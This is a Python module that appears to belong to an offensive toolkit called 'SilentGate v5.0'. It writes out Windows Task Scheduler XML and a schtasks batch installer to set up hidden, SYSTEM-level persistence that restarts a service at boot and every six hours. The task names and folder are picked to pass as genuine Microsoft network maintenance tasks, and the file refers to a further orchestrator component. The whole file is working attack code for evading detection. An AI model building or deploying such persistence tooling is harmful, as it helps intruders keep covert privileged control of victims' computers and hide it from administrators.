"""
SilentGate v5.0 - Component 4: Task Scheduler Persistence
INPUT  : service name + config
OUTPUT : Task Scheduler XML + schtasks.exe installation command
         Persistence survives reboot
         Task named after legitimate Windows maintenance patterns
         SYSTEM authority — indistinguishable from Windows tasks

MITRE: T1053.005 - Scheduled Task/Job: Scheduled Task
"""

import os
import json
from datetime import datetime


# Task names that blend with legitimate Windows tasks
TASK_NAMES = [
    "Windows Network Connectivity Maintenance",
    "Network Location Awareness Update",
    "Network Service Health Monitor",
]


def generate_task_xml(service_name, task_name=None):
    """
    Generate Task Scheduler XML.
    Structure matches legitimate Windows maintenance tasks.
    Triggers: system startup + every 6 hours.
    Authority: NT AUTHORITY\\SYSTEM
    """
    if not task_name:
        task_name = TASK_NAMES[0]

    now = __import__("datetime").datetime.now().strftime("%Y-%m-%dT%H:%M:%S")

    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3"
  xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">

  <RegistrationInfo>
    <Date>{now}</Date>
    <Author>NT AUTHORITY\\System</Author>
    <Description>Monitors and maintains network service connectivity for Windows services.</Description>
    <URI>\\Microsoft\\Windows\\Network\\{task_name}</URI>
  </RegistrationInfo>

  <Triggers>
    <!-- Trigger 1: Run at system startup -->
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT2M</Delay>
    </BootTrigger>
    <!-- Trigger 2: Run every 6 hours -->
    <CalendarTrigger>
      <StartBoundary>{now}</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
      <Repetition>
        <Interval>PT6H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
    </CalendarTrigger>
  </Triggers>

  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>

  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>

  <Actions Context="Author">
    <Exec>
      <Command>%SystemRoot%\\system32\\sc.exe</Command>
      <Arguments>start {service_name}</Arguments>
    </Exec>
  </Actions>

</Task>
"""
    return xml


def generate_install_commands(service_name, task_name,
                               xml_path, task_folder):
    """
    Generate schtasks.exe commands for task registration.
    Uses only legitimate Windows tools.
    """
    cmds = f"""@echo off
:: SilentGate v5.0 - Persistence Installer
:: Author: JarDani
:: Uses Windows Task Scheduler for persistence

echo [PERSIST] Installing scheduled task...

:: Import task from XML
schtasks /Create /TN "Microsoft\\Windows\\Network\\{task_name}" ^
    /XML "{xml_path}" /F >nul

echo [PERSIST] Task registered: {task_name}

:: Verify task exists
schtasks /Query /TN "Microsoft\\Windows\\Network\\{task_name}" >nul
if %errorlevel% equ 0 (
    echo [PERSIST] Verified - task is active
    echo [PERSIST] Trigger: system startup + every 6 hours
    echo [PERSIST] Authority: NT AUTHORITY\\SYSTEM
) else (
    echo [PERSIST] Warning - task registration may have failed
)

echo [PERSIST] Complete
"""
    return cmds


def generate_cleanup_commands(task_name):
    """Remove scheduled task during cleanup."""
    return f"""@echo off
:: SilentGate v5.0 - Persistence Cleanup
schtasks /Delete /TN "Microsoft\\Windows\\Network\\{task_name}" /F >nul 2>&1
echo [CLEANUP] Scheduled task removed
"""


def generate(service_name="NetworkLocationHelper",
             task_name=None,
             output_dir="output"):
    """Main entry point — generate persistence artifacts."""
    os.makedirs(output_dir, exist_ok=True)

    if not task_name:
        task_name = TASK_NAMES[0]

    task_folder = "Microsoft\\Windows\\Network"
    xml_path    = os.path.join(output_dir, "v5_task.xml")
    install_path = os.path.join(output_dir, "v5_persist_install.bat")
    cleanup_path = os.path.join(output_dir, "v5_persist_cleanup.bat")

    xml_content     = generate_task_xml(service_name, task_name)
    install_content = generate_install_commands(
        service_name, task_name, xml_path, task_folder
    )
    cleanup_content = generate_cleanup_commands(task_name)

    with open(xml_path,     "w", encoding="utf-8") as f:
        f.write(xml_content)
    with open(install_path, "w") as f:
        f.write(install_content)
    with open(cleanup_path, "w") as f:
        f.write(cleanup_content)

    meta = {
        "task_name":      task_name,
        "task_folder":    task_folder,
        "task_full_path": f"{task_folder}\\{task_name}",
        "service_target": service_name,
        "triggers":       ["BootTrigger (2min delay)", "Every 6 hours"],
        "authority":      "NT AUTHORITY\\SYSTEM (S-1-5-18)",
        "hidden":         True,
        "xml_path":       xml_path,
        "install_path":   install_path,
        "cleanup_path":   cleanup_path,
        "mitre":          "T1053.005 - Scheduled Task",
        "blend_target":   "Microsoft\\Windows\\Network task group",
    }

    print(f"[V5 PERSIST] Task name   : {task_name}")
    print(f"[V5 PERSIST] Location    : {task_folder}\\{task_name}")
    print(f"[V5 PERSIST] Triggers    : Boot (2min delay) + every 6h")
    print(f"[V5 PERSIST] Authority   : NT AUTHORITY\\SYSTEM")
    print(f"[V5 PERSIST] Hidden      : True")
    print(f"[V5 PERSIST] Action      : sc.exe start {service_name}")
    print(f"[V5 PERSIST] XML         : {xml_path}")
    print(f"[V5 PERSIST] Install     : {install_path}")
    print(f"[V5 PERSIST] Cleanup     : {cleanup_path}")
    print(f"[V5 PERSIST] NEXT        : v5_orchestrator.py")

    return meta


if __name__ == "__main__":
    meta = generate()
    print(f"\n[V5 PERSIST] SUCCESS")
    print(f"[V5 PERSIST] Task blends into Microsoft\\Windows\\Network group")
